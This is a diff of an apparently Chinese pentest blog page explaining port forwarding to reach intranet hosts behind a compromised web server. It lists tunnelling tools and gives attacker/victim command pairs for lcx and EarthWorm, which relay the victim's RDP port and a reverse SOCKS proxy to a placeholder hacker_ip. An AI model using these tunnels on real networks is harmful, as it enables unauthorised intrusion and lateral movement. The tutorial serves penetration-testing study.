@@ -82,25 +82,18 @@
     [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91">端口转发</a>)
 </div>
 
-      <div>
-
-<h3 id="0x00-应用场景">0x00 应用场景</h3>
-
+      <div><h3 id="0x00-应用场景">0x00 应用场景</h3>
 <ul>
 <li>内网IP的80端口通过端口映射到了外网IP的80端口上</li>
 <li>内网的Web服务器通过外网IP反向代理(如Nginx)
 也就是说Web服务器在内网中</li>
 </ul>
-
 <h3 id="0x01-判断web是否为内网">0x01 判断Web是否为内网</h3>
-
 <ul>
 <li>向ping域名，查看IP是外网</li>
 <li>用webshell查看ip却是内网IP</li>
 </ul>
-
 <h3 id="0x02-端口转发工具">0x02 端口转发工具</h3>
-
 <ul>
 <li>lcx</li>
 <li>htran</li>
@@ -109,44 +102,32 @@
 <li><a href="https://github.com/sensepost/reGeorg?_blank">reGeorg</a></li>
 <li>meterpreter porfwd</li>
 </ul>
-
 <h3 id="0x03-lcx端口转发">0x03 lcx端口转发</h3>
-
 <ul>
 <li>Hacker：lcx.exe -listen 500 8888</li>
 <li>Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389</li>
 <li>Hacker：cmd mstsc hacker_ip:500</li>
 </ul>
-
-<p><img src="/img/post/privilge_escalation_win_hacker_run_lcx.png" alt="hacker运行lcx" />
-<img src="/img/post/privilge_escalation_win_vimctim_run_lcx.png" alt="vimctim端运行lcx" />
-<img src="/img/post/privilge_escalation_win_hacker_remote_conn.png" alt="hacker远程连接" />
-<img src="/img/post/privilge_escalation_win_hacker_remote_conn_success.png" alt="hacker远程连接成功" /></p>
-
+<p><img src="/img/post/privilge_escalation_win_hacker_run_lcx.png" alt="hacker运行lcx">
+<img src="/img/post/privilge_escalation_win_vimctim_run_lcx.png" alt="vimctim端运行lcx">
+<img src="/img/post/privilge_escalation_win_hacker_remote_conn.png" alt="hacker远程连接">
+<img src="/img/post/privilge_escalation_win_hacker_remote_conn_success.png" alt="hacker远程连接成功"></p>
 <h3 id="0x04-earchworm端口转发">0x04 EarchWorm端口转发</h3>
-
 <ul>
 <li>Hacker：./ew -s rcsocks -l 1080 -e 8888</li>
-
-<li><p>Victim：./ew -s rssocks -d hacker_ip -e 8888
-<img src="/img/post/privilge_escalation_win_earchworm.png" alt="earchworm原理" /></p>
-
-<h4 id="1-启动earchworm">1. 启动EarchWorm</h4>
-
-<p><img src="/img/post/privilge_escalation_win_linux_run_ew.png" alt="hacker服务器启动ew" />
-<img src="/img/post/privilge_escalation_win_victim_run_ew.png" alt="victim启动ew" />
-<img src="/img/post/privilge_escalation_win_linux_get_victim_conn.png" alt="victim连接hacker服务器" /></p>
-
-<h4 id="2-hacker主机使用代理">2. hacker主机使用代理</h4>
-
-<p><img src="/img/post/privilge_escalation_win_hacker_set_proxy1.png" alt="hacker内网主机设置代理1" />
-<img src="/img/post/privilge_escalation_win_hacker_set_proxy2.png" alt="hacker内网主机设置代理2" /></p>
-
-<h4 id="3-hacker内网主机连接目标的内网主机">3. hacker内网主机连接目标的内网主机</h4>
-
-<p><img src="/img/post/privilge_escalation_win_ew_hacker_remote_conn.png" alt="hacker连接内网主机" />
-<img src="/img/post/privilge_escalation_win_ew_hacker_remote_conn_success.png" alt="hacker连接内网主机成功" /></p></li>
+<li>Victim：./ew -s rssocks -d hacker_ip -e 8888
+<img src="/img/post/privilge_escalation_win_earchworm.png" alt="earchworm原理"></li>
 </ul>
+<h4 id="1-启动earchworm">1. 启动EarchWorm</h4>
+<p><img src="/img/post/privilge_escalation_win_linux_run_ew.png" alt="hacker服务器启动ew">
+<img src="/img/post/privilge_escalation_win_victim_run_ew.png" alt="victim启动ew">
+<img src="/img/post/privilge_escalation_win_linux_get_victim_conn.png" alt="victim连接hacker服务器"></p>
+<h4 id="2-hacker主机使用代理">2. hacker主机使用代理</h4>
+<p><img src="/img/post/privilge_escalation_win_hacker_set_proxy1.png" alt="hacker内网主机设置代理1">
+<img src="/img/post/privilge_escalation_win_hacker_set_proxy2.png" alt="hacker内网主机设置代理2"></p>
+<h4 id="3-hacker内网主机连接目标的内网主机">3. hacker内网主机连接目标的内网主机</h4>
+<p><img src="/img/post/privilge_escalation_win_ew_hacker_remote_conn.png" alt="hacker连接内网主机">
+<img src="/img/post/privilge_escalation_win_ew_hacker_remote_conn_success.png" alt="hacker连接内网主机成功"></p>
 </div>
     </article>
   </main>
